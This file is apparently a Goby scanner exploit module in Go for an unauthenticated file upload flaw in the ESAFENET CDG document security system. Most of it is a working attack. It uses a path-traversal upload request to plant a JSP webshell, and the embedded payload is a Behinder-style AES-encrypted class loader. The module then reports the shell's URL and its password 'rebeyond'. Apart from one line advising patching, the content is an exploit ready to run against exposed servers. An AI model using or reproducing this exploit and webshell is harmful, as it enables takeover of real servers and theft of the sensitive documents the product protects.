package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "EST electronic document security management system /DecryptApplicationService2 Arbitrary file upload vulnerability",
    "Description": "<p>The electronic document security management system is an electronic document security encryption software, which uses the transparent encryption technology of the driver layer to prevent internal employees from leaking secrets and external personnel from illegally stealing the core important data assets of the enterprise through the encryption protection of electronic documents, and protects the whole life cycle of electronic documents, and the system has a variety of encryption methods such as transparent encryption, active encryption, and intelligent encryption.</p><p>There is an unauthorized file upload vulnerability in the /DecryptApplicationService2 directory of Esetto's electronic document security management system, which can be exploited by an attacker to obtain server control permissions.</p>",
    "Product": "ESAFENET-CDG",
    "Homepage": "http://www.esafenet.com/",
    "DisclosureDate": "2023-09-20",
    "PostTime": "2024-03-14",
    "Author": "兰公子",
    "FofaQuery": "body=\"/CDGServer3/index.jsp\" && title=\"电子文档安全管理系统\"",
    "GobyQuery": "body=\"/CDGServer3/index.jsp\" && title=\"电子文档安全管理系统\"",
    "Level": "3",
    "Impact": "<p>There is an unauthorized file upload vulnerability in the /DecryptApplicationService2 directory of Esetto's electronic document security management system, which can be exploited by an attacker to obtain server control permissions.</p>",
    "Recommendation": "<p>The manufacturer has released a patch, please pay attention to the update on the manufacturer's homepage in time: <a href=\"https://www.esafenet.com/\">https://www.esafenet.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "choose",
            "type": "select",
            "value": "default,customize",
            "show": ""
        },
        {
            "name": "customize",
            "type": "input",
            "value": "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>",
            "show": "choose=customize"
        },
        {
            "name": "name",
            "type": "input",
            "value": "test.jsp",
            "show": "choose=customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/CDGServer3/DecryptApplicationService2?fileId=../../../Program+Files+(x86)/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/test.jsp",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "test"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/CDGServer3/test.jsp",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        null
    ],
    "Tags": [
        "File Upload",
        "HW-2023"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.4",
    "Translation": {
        "CN": {
            "Name": "亿赛通电子文档安全管理系统 /DecryptApplicationService2 任意文件上传漏洞",
            "Product": "亿赛通-电子文档安全管理系统",
            "Description": "<p>亿赛通电子文档安全管理系统是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式。<br></p><p>亿赛通电子文档安全管理系统 /DecryptApplicationService2 目录存在未授权文件上传漏洞，攻击者可利用该漏洞获取服务器控制权限。</p>",
            "Recommendation": "<p>厂商已经发布补丁，请及时关注厂商主页更新：<a href=\"https://www.esafenet.com/\">https://www.esafenet.com/</a></p>",
            "Impact": "<p>亿赛通电子文档安全管理系统 /DecryptApplicationService2 目录存在未授权文件上传漏洞，攻击者可利用该漏洞获取服务器控制权限。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "EST electronic document security management system /DecryptApplicationService2 Arbitrary file upload vulnerability",
            "Product": "ESAFENET-CDG",
            "Description": "<p>The electronic document security management system is an electronic document security encryption software, which uses the transparent encryption technology of the driver layer to prevent internal employees from leaking secrets and external personnel from illegally stealing the core important data assets of the enterprise through the encryption protection of electronic documents, and protects the whole life cycle of electronic documents, and the system has a variety of encryption methods such as transparent encryption, active encryption, and intelligent encryption.<br></p><p>There is an unauthorized file upload vulnerability in the /DecryptApplicationService2 directory of Esetto's electronic document security management system, which can be exploited by an attacker to obtain server control permissions.</p>",
            "Recommendation": "<p>The manufacturer has released a patch, please pay attention to the update on the manufacturer's homepage in time: <a href=\"https://www.esafenet.com/\">https://www.esafenet.com/</a></p>",
            "Impact": "<p>There is an unauthorized file upload vulnerability in the /DecryptApplicationService2 directory of Esetto's electronic document security management system, which can be exploited by an attacker to obtain server control permissions.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10934"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			choose := goutils.B2S(ss.Params["choose"])
			customize := goutils.B2S(ss.Params["customize"])
			password := "rebeyond"
			shell_type := "Behinder"
			name := goutils.B2S(ss.Params["name"])

			//构造Post请求
			nameDefault := goutils.RandomHexString(16) + ".jsp"
			postRequestConfig := httpclient.NewPostRequestConfig("/CDGServer3/DecryptApplicationService2?fileId=../../../Program+Files+(x86)/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/" + nameDefault)
			postRequestConfig.VerifyTls = false
			postRequestConfig.FollowRedirect = false
			postRequestConfig.Data = customize

			//请求
			rsp, err := httpclient.DoHttpRequest(expResult.HostInfo, postRequestConfig)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}

			// 资源存在
			if rsp.StatusCode != 200 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}

			ss.VulURL = expResult.HostInfo.FixedHostInfo

			if choose == "default" {
				expResult.Success = true
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/CDGServer3/" + nameDefault + "\n"
				expResult.Output += "Password: " + password + "\n"
				expResult.Output += "WebShell tool: " + shell_type + "\n"
				return expResult
			}

			expResult.Success = true
			expResult.Output += "文件上传成功：WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/CDGServer3/" + name + "\n"
			return expResult
		},
	))
}
